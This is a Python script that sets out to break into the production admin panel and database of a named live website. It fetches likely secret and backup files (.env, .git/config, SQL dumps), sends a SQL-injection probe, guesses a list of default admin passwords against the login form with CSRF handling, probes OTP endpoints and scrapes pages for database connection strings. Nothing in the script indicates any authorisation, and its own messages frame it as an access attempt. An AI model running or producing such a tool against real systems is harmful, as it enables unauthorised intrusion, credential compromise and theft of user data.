#!/usr/bin/env python3
"""
Attempt to access production database/admin panel
Tests various attack vectors
"""

import requests
import time
import re

BASE_URL = "https://national77.com"

def test_exposed_files():
    """Check for exposed configuration files"""
    print("\n" + "="*60)
    print("TEST 1: Exposed Configuration Files")
    print("="*60)
    
    files_to_check = [
        "/.env",
        "/.env.local",
        "/.env.production",
        "/config.py",
        "/settings.py",
        "/settings/local.py",
        "/broker_portal/settings.py",
        "/.git/config",
        "/.git/HEAD",
        "/docker-compose.yml",
        "/.dockerignore",
        "/requirements.txt",
        "/manage.py",
        "/backup.sql",
        "/backups/",
        "/db.sqlite3",
        "/database.sql",
    ]
    
    found_files = []
    
    for file_path in files_to_check:
        url = f"{BASE_URL}{file_path}"
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            
            if response.status_code == 200:
                content = response.text.lower()
                # Check if it contains sensitive info
                if any(keyword in content for keyword in ['password', 'secret', 'database', 'db_password', 'db_user', 'postgres']):
                    print(f"  ⚠️  FOUND: {file_path}")
                    print(f"      Contains sensitive keywords!")
                    found_files.append((file_path, response.text[:500]))
                else:
                    print(f"  ✓ {file_path} exists but no sensitive data visible")
            elif response.status_code == 403:
                print(f"  ✓ {file_path} protected (403)")
            elif response.status_code == 404:
                pass  # Don't print 404s
            else:
                print(f"  ? {file_path}: Status {response.status_code}")
                
        except Exception as e:
            pass
    
    return found_files

def test_django_debug_panel():
    """Check for Django debug panel exposure"""
    print("\n" + "="*60)
    print("TEST 2: Django Debug Panel")
    print("="*60)
    
    # Try to trigger an error to see if debug panel is enabled
    test_urls = [
        f"{BASE_URL}/admin/login/?next=/admin/nonexistent/",
        f"{BASE_URL}/?test=1' OR 1=1--",
        f"{BASE_URL}/api/invalid_endpoint/",
    ]
    
    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            
            # Check for Django debug page indicators
            if 'django' in response.text.lower() and ('traceback' in response.text.lower() or 'settings' in response.text.lower()):
                print(f"  ⚠️  DEBUG MODE ENABLED: {url}")
                print(f"      This could expose sensitive information!")
                # Try to extract database settings
                if 'database' in response.text.lower():
                    print(f"      Database configuration might be visible!")
            else:
                print(f"  ✓ Debug panel not exposed")
                break
                
        except Exception as e:
            pass

def test_default_credentials():
    """Try common default credentials"""
    print("\n" + "="*60)
    print("TEST 3: Default Credentials")
    print("="*60)
    
    common_credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('admin', 'admin123'),
        ('admin', 'root'),
        ('root', 'root'),
        ('admin', ''),
    ]
    
    login_url = f"{BASE_URL}/login/"
    session = requests.Session()
    session.get(login_url)
    
    for username, password in common_credentials:
        print(f"\nTrying: {username} / {password}")
        
        # Get CSRF token
        response = session.get(login_url)
        csrf_token = None
        if 'csrftoken' in session.cookies:
            csrf_token = session.cookies['csrftoken']
        elif 'csrfmiddlewaretoken' in response.text:
            match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
            if match:
                csrf_token = match.group(1)
        
        data = {
            'username': username,
            'password': password
        }
        if csrf_token:
            data['csrfmiddlewaretoken'] = csrf_token
        
        try:
            response = session.post(login_url, data=data, allow_redirects=False)
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'dashboard' in location or 'admin' in location:
                    print(f"  ⚠️  SUCCESS! Credentials work: {username}/{password}")
                    return (username, password)
                else:
                    print(f"  ✗ Failed")
            elif response.status_code == 200:
                if 'invalid' not in response.text.lower():
                    print(f"  ? Check manually")
            else:
                print(f"  Status: {response.status_code}")
                
        except Exception as e:
            print(f"  ❌ Error: {e}")
        
        time.sleep(1)  # Avoid rate limiting
    
    return None

def test_otp_bypass():
    """Try to bypass OTP verification"""
    print("\n" + "="*60)
    print("TEST 4: OTP Bypass")
    print("="*60)
    
    # Check if we can access signup/verify endpoints
    endpoints = [
        "/signup/",
        "/verify-otp/",
        "/resend-otp/",
    ]
    
    for endpoint in endpoints:
        url = f"{BASE_URL}{endpoint}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"  ✓ {endpoint} accessible")
                # Check if we can submit without proper OTP
                if 'verify-otp' in endpoint:
                    print(f"  ⚠️  OTP endpoint accessible - test manual bypass")
            else:
                print(f"  {endpoint}: Status {response.status_code}")
        except Exception as e:
            pass

def test_api_endpoints_discovery():
    """Discover API endpoints"""
    print("\n" + "="*60)
    print("TEST 5: API Endpoint Discovery")
    print("="*60)
    
    api_root = f"{BASE_URL}/api/"
    
    try:
        response = requests.get(api_root, timeout=5)
        if response.status_code == 200:
            print(f"  ✓ API root accessible")
            print(f"  Response: {response.text[:500]}")
            
            # Try to extract endpoint URLs
            if 'login' in response.text.lower():
                print(f"  ⚠️  Login endpoint found in API root")
        else:
            print(f"  API root: Status {response.status_code}")
    except Exception as e:
        pass

def test_backup_files():
    """Check for exposed backup files"""
    print("\n" + "="*60)
    print("TEST 6: Backup Files")
    print("="*60)
    
    backup_paths = [
        "/backup.sql",
        "/backups/backup.sql",
        "/backups/postgres_backup.sql",
        "/backups/django_backup.json",
        "/db_backup.sql",
        "/database_backup.sql",
        "/dump.sql",
    ]
    
    for path in backup_paths:
        url = f"{BASE_URL}{path}"
        try:
            response = requests.get(url, timeout=5, stream=True)
            if response.status_code == 200:
                # Check if it's actually a SQL/backup file
                content_type = response.headers.get('Content-Type', '')
                if 'sql' in content_type.lower() or 'json' in content_type.lower() or 'text' in content_type.lower():
                    print(f"  ⚠️  BACKUP FILE FOUND: {path}")
                    print(f"      Size: {len(response.content)} bytes")
                    # Check if it contains user data
                    content_preview = response.text[:500].lower()
                    if 'password' in content_preview or 'auth_user' in content_preview:
                        print(f"      ⚠️  Contains user/password data!")
        except Exception as e:
            pass

def test_database_connection_strings():
    """Try to find database connection strings in responses"""
    print("\n" + "="*60)
    print("TEST 7: Database Connection Strings")
    print("="*60)
    
    # Check error pages for database info
    test_urls = [
        f"{BASE_URL}/admin/",
        f"{BASE_URL}/api/invalid/",
    ]
    
    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            text = response.text.lower()
            
            # Look for database connection patterns
            patterns = [
                r'postgresql://[^\s<>"]+',
                r'postgres://[^\s<>"]+',
                r'db_password[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'database[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'host[=:]\s*[\'"]([^\'"]+)[\'"]',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    print(f"  ⚠️  Found database connection info in {url}")
                    for match in matches[:3]:  # Show first 3
                        print(f"      {match[:50]}...")
        except Exception as e:
            pass

def test_admin_panel_paths():
    """Try different admin panel paths"""
    print("\n" + "="*60)
    print("TEST 8: Admin Panel Path Discovery")
    print("="*60)
    
    admin_paths = [
        "/admin/",
        "/admin/login/",
        "/administrator/",
        "/wp-admin/",
        "/phpmyadmin/",
        "/adminer/",
        "/django-admin/",
        "/manage/",
    ]
    
    for path in admin_paths:
        url = f"{BASE_URL}{path}"
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code == 200:
                if 'login' in response.text.lower() or 'username' in response.text.lower():
                    print(f"  ⚠️  Admin interface found: {path}")
            elif response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'login' in location.lower():
                    print(f"  ✓ Admin panel exists at {path} (redirects to login)")
        except Exception as e:
            pass

def main():
    """Run all exploitation attempts"""
    print("="*60)
    print("PRODUCTION ACCESS ATTEMPT")
    print(f"Target: {BASE_URL}")
    print("="*60)
    
    print("\nTesting multiple attack vectors to access production...")
    
    # Run all tests
    exposed_files = test_exposed_files()
    test_django_debug_panel()
    credentials = test_default_credentials()
    test_otp_bypass()
    test_api_endpoints_discovery()
    test_backup_files()
    test_database_connection_strings()
    test_admin_panel_paths()
    
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    
    if exposed_files:
        print("\n⚠️  EXPOSED FILES FOUND:")
        for file_path, content in exposed_files:
            print(f"  - {file_path}")
    
    if credentials:
        print(f"\n⚠️  WORKING CREDENTIALS FOUND:")
        print(f"  Username: {credentials[0]}")
        print(f"  Password: {credentials[1]}")
    
    print("\n" + "="*60)
    print("If no vulnerabilities found, production is well protected.")
    print("To access production admin, you need:")
    print("  1. SSH access to production server")
    print("  2. Or the actual admin password")
    print("  3. Or find an exposed vulnerability")
    print("="*60)

if __name__ == "__main__":
    main()
